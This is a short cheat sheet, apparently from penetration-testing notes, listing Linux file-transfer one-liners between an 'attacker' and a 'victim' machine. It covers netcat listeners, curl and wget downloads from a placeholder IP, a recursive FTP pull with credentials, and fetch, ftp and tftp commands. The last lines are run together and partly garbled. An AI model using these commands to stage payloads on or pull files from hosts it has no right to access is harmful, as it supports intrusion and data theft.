# File Transfer Linux

<b>Netcat:</b>

	On Victim machine (client):

	nc -nlvp 4444 > <[FILE]>

	On Attacker machine (server):

	nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>

<b>Curl:</b>

	curl -O http://<[IP]>/<[FILE]>
	
<b>Wget:</b>

	wget http://<[IP]>/<[FILE]>
	
<b>Recursive wget ftp download:</b>

	wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>

wget http://IP_ADDR/file -O /path/to/where/you/want/file/to/go

curl http://IP_ADDR/file

fetch http://IP_ADDR/filenc IP_ADDR PORT > OUTFILE (run 

nc -lvp PORT < infile on attacking machine)ftp -s:input.txt

tftp -i get file /path/on/victim
